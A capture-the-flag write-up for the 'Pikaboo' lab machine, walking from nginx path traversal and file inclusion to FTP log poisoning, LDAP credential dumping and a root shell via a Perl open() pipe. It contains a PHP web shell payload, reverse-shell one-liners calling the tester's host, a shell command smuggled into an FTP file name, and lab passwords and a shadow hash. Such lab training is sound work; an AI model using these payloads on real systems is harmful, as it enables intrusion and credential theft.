# Pikaboo Writeup

# Enumeration

```other
⛩\> nmap -p- -sV -sC -v -oA enum --min-rate 4500 --max-rtt-timeout 1500ms --open 10.129.186.91
Nmap scan report for 10.129.186.91
Host is up (0.27s latency).
Not shown: 65516 closed ports, 16 filtered ports
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey:
|   2048 17:e1:13:fe:66:6d:26:b6:90:68:d0:30:54:2e:e2:9f (RSA)
|   256 92:86:54:f7:cc:5a:1a:15:fe:c6:09:cc:e5:7c:0d:c3 (ECDSA)
|_  256 f4:cd:6f:3b:19:9c:cf:33:c6:6d:a5:13:6a:61:01:42 (ED25519)
80/tcp open  http    nginx 1.14.2
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: nginx/1.14.2
|_http-title: Pikaboo
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

Nmap reveals three open ports on the machine. HTTP is running via NginX, probably as a web-server or reverse-proxy.

![Screen Shot 2021-07-20 at 23.21.18.png](https://res.craft.do/user/full/f2720b1c-ea2b-4053-35cc-fe42cb8a5e5e/doc/5AD46529-1428-475F-B1B6-D9EAC2A22BD9/90F9BFC8-0CF2-4F22-AA0D-DB26A668B6CC_2/Screen%20Shot%202021-07-20%20at%2023.21.18.png)

There’s nothing much in homepage, the Poketdex has pokemon’s.

![Screen Shot 2021-07-20 at 23.32.55.png](https://res.craft.do/user/full/f2720b1c-ea2b-4053-35cc-fe42cb8a5e5e/doc/5AD46529-1428-475F-B1B6-D9EAC2A22BD9/774D145D-1A4A-458F-96F2-5CEC29993EDE_2/Screen%20Shot%202021-07-20%20at%2023.32.55.png)

If we click on any pokemon it gives us this message.

![Screen Shot 2021-07-20 at 23.46.15.png](https://res.craft.do/user/full/f2720b1c-ea2b-4053-35cc-fe42cb8a5e5e/doc/5AD46529-1428-475F-B1B6-D9EAC2A22BD9/E178E214-7316-4481-A1FA-21429FB75A6E_2/Screen%20Shot%202021-07-20%20at%2023.46.15.png)

The Admin endpoint has basic authentication enabled.

![Screen Shot 2021-07-20 at 23.49.13.png](https://res.craft.do/user/full/f2720b1c-ea2b-4053-35cc-fe42cb8a5e5e/doc/5AD46529-1428-475F-B1B6-D9EAC2A22BD9/404C4025-1013-401F-9A8A-5B2D49F78F35_2/Screen%20Shot%202021-07-20%20at%2023.49.13.png)

If we cancel the dialogue box, it gives us this below error.

![Screen Shot 2021-07-20 at 23.50.00.png](https://res.craft.do/user/full/f2720b1c-ea2b-4053-35cc-fe42cb8a5e5e/doc/5AD46529-1428-475F-B1B6-D9EAC2A22BD9/C255B8C5-4028-4762-89D0-8A73BE10C75F_2/Screen%20Shot%202021-07-20%20at%2023.50.00.png)

This error shows that Apache is running on port 81. So, NginX is running as reverse-proxy on port 80 and Apache is running on port 81. When any of the reverse-proxy meets a backend-server, then there’s a possibility of bug due to misconfiguration and/or architectural problems.

> [https://i.blackhat.com/us-18/Wed-August-8/us-18-Orange-Tsai-Breaking-Parser-Logic-Take-Your-Path-Normalization-Off-And-Pop-0days-Out-2.pdf](https://i.blackhat.com/us-18/Wed-August-8/us-18-Orange-Tsai-Breaking-Parser-Logic-Take-Your-Path-Normalization-Off-And-Pop-0days-Out-2.pdf)

[Common Nginx misconfigurations that leave your web server open to attack | Detectify Blog](https://blog.detectify.com/2020/11/10/common-nginx-misconfigurations/)

These two blogs explain how reverse-proxy’s are vulnerable to different types of attack. But for this machine, we will take advantage of **off-by-slash** misconfiguration to traverse one step up the path.

![Screen Shot 2021-07-21 at 00.43.22.png](https://res.craft.do/user/full/f2720b1c-ea2b-4053-35cc-fe42cb8a5e5e/doc/5AD46529-1428-475F-B1B6-D9EAC2A22BD9/9CD47DDF-E269-45F0-9380-2EA58914C2A1_2/Screen%20Shot%202021-07-21%20at%2000.43.22.png)

If we try this attack on admin endpoint then it gives forbidden error, but if we try this on other endpoints then it’d give not found error. So, this admin is vulnerable to off-by-slash misconfiguration.

Let’s run a directory brute-force on this endpoint to find any files or directory.

```other
⛩\> gobuster dir -u http://10.129.186.91/admin../ -t 30 -b 404,403 -w ~/tools/SecLists/Discovery/Web-Content/raft-small-words.txt
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.129.186.91/admin../
[+] Method:                  GET
[+] Threads:                 30
[+] Wordlist:                /home/kali/tools/SecLists/Discovery/Web-Content/raft-small-words.txt
[+] Negative Status codes:   403,404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2021/07/20 10:28:15 Starting gobuster in directory enumeration mode
===============================================================
/admin                (Status: 401) [Size: 456]
/javascript           (Status: 301) [Size: 314] [--> http://127.0.0.1:81/javascript/]
/server-status        (Status: 200) [Size: 5200]
```

We got these endpoints under admin. Let’s check it.

![Screen Shot 2021-07-21 at 00.50.14.png](https://res.craft.do/user/full/f2720b1c-ea2b-4053-35cc-fe42cb8a5e5e/doc/5AD46529-1428-475F-B1B6-D9EAC2A22BD9/4B4E6ABF-ADD0-4110-B2C0-465E1AFA1C9A_2/Screen%20Shot%202021-07-21%20at%2000.50.14.png)

We got access to Apache server status and we can see some logs, ‘admin_staging’ endpoint is new to information. Let’s access this.

![Screen Shot 2021-07-21 at 00.57.01.png](https://res.craft.do/user/full/f2720b1c-ea2b-4053-35cc-fe42cb8a5e5e/doc/5AD46529-1428-475F-B1B6-D9EAC2A22BD9/E166FD94-300F-46A9-BB25-75BE4F7648D2_2/Screen%20Shot%202021-07-21%20at%2000.57.01.png)

Material-Dashboard Bootstrap is running on this endpoint. If we click on user profile, then it takes us to this below URL.

![Screen Shot 2021-07-21 at 01.02.24.png](https://res.craft.do/user/full/f2720b1c-ea2b-4053-35cc-fe42cb8a5e5e/doc/5AD46529-1428-475F-B1B6-D9EAC2A22BD9/B0CA5678-7FE6-4FA3-8228-CC147981DFBB_2/Screen%20Shot%202021-07-21%20at%2001.02.24.png)

As you can see user page is being served by calling it directly, so there is a possibility of File Inclusion attack. Let’s try to read the local file.

![Screen Shot 2021-07-21 at 01.10.07.png](https://res.craft.do/user/full/f2720b1c-ea2b-4053-35cc-fe42cb8a5e5e/doc/5AD46529-1428-475F-B1B6-D9EAC2A22BD9/3F18891D-EE1D-4B99-9781-74A8982A9D58_2/Screen%20Shot%202021-07-21%20at%2001.10.07.png)

The response is empty, but we got the 200 status code. Perhaps we can only include specific file to read. Let’s fuzz it find what can we read.

```other
⛩\> wfuzz -c -w ~/tools/SecLists/Fuzzing/LFI/LFI-Jhaddix.txt --hl 367 http://10.129.186.91/admin../admin_staging/index.php?page=FUZZ

********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://10.129.186.91/admin../admin_staging/index.php?page=FUZZ
Total requests: 914

=====================================================================
ID           Response   Lines    Word       Chars       Payload
=====================================================================

000000733:   200        413 L    1670 W     19803 Ch    "/var/log/vsftpd.log"
000000734:   200        561 L    1386 W     169651 Ch   "/var/log/wtmp"

Total time: 0
Processed Requests: 914
Filtered Requests: 912
Requests/sec.: 0
```

We can read only two specific log files. There is a possibility of ‘Log Poisoning’ via FTP.

![Screen Shot 2021-07-22 at 00.21.01.png](https://res.craft.do/user/full/f2720b1c-ea2b-4053-35cc-fe42cb8a5e5e/doc/5AD46529-1428-475F-B1B6-D9EAC2A22BD9/3D008D7E-7603-4835-8137-25962C5EF0D6_2/Screen%20Shot%202021-07-22%20at%2000.21.01.png)

![Screen Shot 2021-07-22 at 00.31.11.png](https://res.craft.do/user/full/f2720b1c-ea2b-4053-35cc-fe42cb8a5e5e/doc/5AD46529-1428-475F-B1B6-D9EAC2A22BD9/883E78D7-B1D7-404C-ADAB-3FE2B748CFBC_2/Screen%20Shot%202021-07-22%20at%2000.31.11.png)

As we already know that PHP is used to develop this site, so we can tamper the logs with PHP code to get RCE and this can be done via username field. When we inject PHP code in username field and it will be recorded in the logs and we access the logs via LFI the code gets executed.

# Initial Access

```other
⛩\> ftp 10.129.95.157 21
Connected to 10.129.95.157.
220 (vsFTPd 3.0.3)
Name (10.129.95.157:kali): '<?php system($_GET['c']); ?>'
331 Please specify the password.
Password:
530 Login incorrect.
Login failed.
ftp>
```

We will pass the PHP code in username field.

![Screen Shot 2021-07-22 at 02.03.16.png](https://res.craft.do/user/full/f2720b1c-ea2b-4053-35cc-fe42cb8a5e5e/doc/5AD46529-1428-475F-B1B6-D9EAC2A22BD9/64D20610-93A4-4EB5-A853-E85747EA9FC6_2/Screen%20Shot%202021-07-22%20at%2002.03.16.png)

Execute linux command and we’d get the result in log. Now we have a working RCE. Let’s get a reverse shell. Setup a netcat listener before you execute next command. We need to URL encode the bash one-liner.

```other
⛩\> curl "10.129.95.157/admin../admin_staging/index.php?page=/var/log/vsftpd.log&c=%2Fbin%2Fbash%20-c%20%22%2Fbin%2Fbash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.10.14.31%2F1234%200%3E%261%22"
```

Check the listener and read user flag.

```other
⛩\> pwncat -l -p 1234
[09:07:49] Welcome to pwncat 🐈!                                                                        __main__.py:143
[09:07:53] received connection from 10.129.95.157:35522                                                      bind.py:57
[09:07:59] 10.129.95.157:35522: registered new host w/ db                                                manager.py:502
(local) pwncat$

(remote) www-data@pikaboo.htb:/var/www/html/admin_staging$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)

(remote) www-data@pikaboo.htb:/var/www/html/admin_staging$ cat /home/pwnmeow/user.txt
58f1b61242b6b380b878f985faf279ad
```

# Privilege Escalation - User

```other
www-data@pikaboo:/home$ grep 'bash' /etc/passwd

root:x:0:0:root:/root:/bin/bash
pwnmeow:x:1000:1000:,,,:/home/pwnmeow:/bin/bash
postgres:x:110:117:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash
```

Now we need to escalate our privs to ‘pwnmeow’ user. Let’s run ‘LinPeas’.

```other
(remote) www-data@pikaboo.htb:/tmp$ bash linpeas.sh

-------SNIP-------
* * * * * root /usr/local/bin/csvupdate_cron
```

A cron job is running with root privileges. So * * * * * means every minute of every hour of every day of every month and every day of the week. Let’s find more Information about this file.

```other
(remote) www-data@pikaboo.htb:/tmp$ file /usr/local/bin/csvupdate_cron
/usr/local/bin/csvupdate_cron: Bourne-Again shell script, ASCII text executable

(remote) www-data@pikaboo.htb:/tmp$ cat /usr/local/bin/csvupdate_cron
#!/bin/bash

for d in /srv/ftp/*
do
  cd $d
  /usr/local/bin/csvupdate $(basename $d) *csv
  /usr/bin/rm -rf *
done
```

It is an ASCII (Bash) file, so we can read it. It is executing a binary with wildcard from a specific directory. Let’s look into permissions of that directory first and then the binary.

```other
(remote) www-data@pikaboo.htb:/srv$ ls -la
total 20
drwxr-xr-x   3 root root  4096 May 10 12:22 .
drwxr-xr-x  18 root root  4096 Jul  9 14:44 ..
drwxr-xr-x 176 root ftp  12288 May 20 08:01 ftp

(remote) www-data@pikaboo.htb:/srv$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Looks like only root can write to the directory and users who are part of FTP group. Let’s list the ‘ftp’ directory.

```other
(remote) www-data@pikaboo.htb:/srv$ ls -lah ftp/
total 712K

drwxr-xr-x 176 root ftp   12K May 20 08:01 .
drwxr-xr-x   3 root root 4.0K May 10 12:22 ..
drwx-wx---   2 root ftp  4.0K May 20 09:54 abilities
drwx-wx---   2 root ftp  4.0K May 20 08:01 ability_changelog
drwx-wx---   2 root ftp  4.0K May 20 08:01 ability_changelog_prose
drwx-wx---   2 root ftp  4.0K May 20 08:01 ability_flavor_text
drwx-wx---   2 root ftp  4.0K May 20 08:01 ability_names
drwx-wx---   2 root ftp  4.0K May 20 08:01 ability_prose
drwx-wx---   2 root ftp  4.0K May 20 08:01 berries
drwx-wx---   2 root ftp  4.0K May 20 08:01 berry_firmness
drwx-wx---   2 root ftp  4.0K May 20 08:01 berry_firmness_names
drwx-wx---   2 root ftp  4.0K May 20 08:01 berry_flavors
drwx-wx---   2 root ftp  4.0K May 20 08:01 characteristic_text
drwx-wx---   2 root ftp  4.0K May 20 08:01 characteristics
drwx-wx---   2 root ftp  4.0K May 20 08:01 conquest_episode_names
```

‘Pwnmeow’ user can write to all of the sub-directory. Let’s check the binary itself.

```other
(remote) www-data@pikaboo.htb:/srv$ head -n 20 /usr/local/bin/csvupdate
#!/usr/bin/perl

##################################################################
# Script for upgrading PokeAPI CSV files with FTP-uploaded data. #
#                                                                #
# Usage:                                                         #
# ./csvupdate <type> <file(s)>                                   #
#                                                                #
# Arguments:                                                     #
# - type: PokeAPI CSV file type                                  #
#         (must have the correct number of fields)               #
# - file(s): list of files containing CSV data                   #
##################################################################

use strict;
use warnings;
use Text::CSV;

my $csv_dir = "/opt/pokeapi/data/v2/csv";
```

It’s a perl script, it takes CSV files and process it.

[open() for Command Execution](https://www.shlomifish.org/lecture/Perl/Newbies/lecture4/processes/opens.html)

[](https://mailman.linuxchix.org/pipermail/courses/2003-September/001344.html)

According to this blog, ‘perl’ has a bug (feature) by design. The open() function in perl can also be used to execute commands.

```other
(remote) www-data@pikaboo.htb:/srv$ cat  /usr/local/bin/csvupdate | grep 'open' -B 5
}

my $csv = Text::CSV->new({ sep_char => ',' });

my $fname = "${csv_dir}/${type}.csv";
open(my $fh, ">>", $fname) or die "Unable to open CSV target file.\n";
```

As you can see the script which has open () function, it is taking input from one of the directory and processing it. So, we can able to drop a file with a name that starts with pipe character with our reverse shell one-liner. Note: Only FTP group users can able to write to that those directories.

### LDAP Creds

```other
(remote) www-data@pikaboo.htb:/opt/pokeapi/config$ grep -i -B 3 'password' settings.py
        "ENGINE": "ldapdb.backends.ldap",
        "NAME": "ldap:///",
        "USER": "cn=binduser,ou=users,dc=pikaboo,dc=htb",
        "PASSWORD": "J~42%W?PFHl]g",
```

In one of the directory we can find the credentials for LDAP. We have to use those creds to dump/search the LDAP for information.

```other
(remote) www-data@pikaboo.htb:/opt/pokeapi/config$ ldapsearch -x -b 'dc=pikaboo,dc=htb' -H ldap://127.0.0.1 -D 'cn=binduser,ou=users,dc=pikaboo,dc=htb' -W
Enter LDAP Password:

# extended LDIF
#
# LDAPv3
# base <dc=pikaboo,dc=htb> with scope subtree
# filter: (objectclass=*)
# requesting: ALL
#

# pikaboo.htb
dn: dc=pikaboo,dc=htb
objectClass: domain
dc: pikaboo

# ftp.pikaboo.htb
dn: dc=ftp,dc=pikaboo,dc=htb
objectClass: domain
dc: ftp

# users, pikaboo.htb
dn: ou=users,dc=pikaboo,dc=htb
objectClass: organizationalUnit
objectClass: top
ou: users

# pokeapi.pikaboo.htb
dn: dc=pokeapi,dc=pikaboo,dc=htb
objectClass: domain
dc: pokeapi

# users, ftp.pikaboo.htb
dn: ou=users,dc=ftp,dc=pikaboo,dc=htb
objectClass: organizationalUnit
objectClass: top
ou: users

# groups, ftp.pikaboo.htb
dn: ou=groups,dc=ftp,dc=pikaboo,dc=htb
objectClass: organizationalUnit
objectClass: top
ou: groups

# pwnmeow, users, ftp.pikaboo.htb
dn: uid=pwnmeow,ou=users,dc=ftp,dc=pikaboo,dc=htb
objectClass: inetOrgPerson
objectClass: posixAccount
objectClass: shadowAccount
uid: pwnmeow
cn: Pwn
sn: Meow
loginShell: /bin/bash
uidNumber: 10000
gidNumber: 10000
homeDirectory: /home/pwnmeow
userPassword:: X0cwdFQ0X0M0dGNIXyczbV80bEwhXw==

# binduser, users, pikaboo.htb
dn: cn=binduser,ou=users,dc=pikaboo,dc=htb
cn: binduser
objectClass: simpleSecurityObject
objectClass: organizationalRole
userPassword:: Sn40MiVXP1BGSGxdZw==

# users, pokeapi.pikaboo.htb
dn: ou=users,dc=pokeapi,dc=pikaboo,dc=htb
objectClass: organizationalUnit
objectClass: top
ou: users

# groups, pokeapi.pikaboo.htb
dn: ou=groups,dc=pokeapi,dc=pikaboo,dc=htb
objectClass: organizationalUnit
objectClass: top
ou: groups

# search result
search: 2
result: 0 Success

# numResponses: 11
# numEntries: 10
```

After searching the LDAP Tree, we found ‘Pwnmeow’ FTP credentials stored in base64 encoded format. Let’s decode them.

```other
(remote) www-data@pikaboo.htb:/opt/pokeapi/config$ echo -n 'X0cwdFQ0X0M0dGNIXyczbV80bEwhXw==' |base64 -d
_G0tT4_C4tcH_'3m_4lL!_
```

Now we can access FTP account. Let’s access it and drop a file with pipe character with reverse shell one-liner.

# Privilege Escalation - Root

```other
⛩\> ftp 10.129.95.157 21
Connected to 10.129.95.157.
220 (vsFTPd 3.0.3)
Name (10.129.95.157:kali): pwnmeow
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> cd versions
```

Create a test file on your kali linux, setup a netcat listener and run below commands.

```other
(local-file) test

(remote-file) "|python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("\"10.10.14.79\",9001));[os.dup2(s.fileno(),f)for\ f\ in(0,1,2)];pty.spawn(""\"sh\")';.csv"
local: test remote: |python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("10.10.14.31",9001));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("sh")';.csv

200 PORT command successful. Consider using PASV.
150 Ok to send data.
226 Transfer complete.
```

Transfer completed successfully. Now check the netcat listener and read the root flag.

```other
⛩\> nc -lvnp 9001
listening on [any] 9001 ...
connect to [10.10.14.31] from (UNKNOWN) [10.129.95.157] 57684
# cat /root/root.txt
cat /root/root.txt

71689b04630390cdbe9abde815311b77

# id
id
uid=0(root) gid=0(root) groups=0(root)

# cat /etc/shadow
cat /etc/shadow

root:$6$rmBpCrNSohpbrXpW$6XizSEcAl0ELQH28F21.V0cvZgWCNkatRbXCv5WNlIW2mkhECPM7wm1j.BRD.t7.Z5CQPvu19EGORXbpOnb540:18816:0:99999:7:::
```

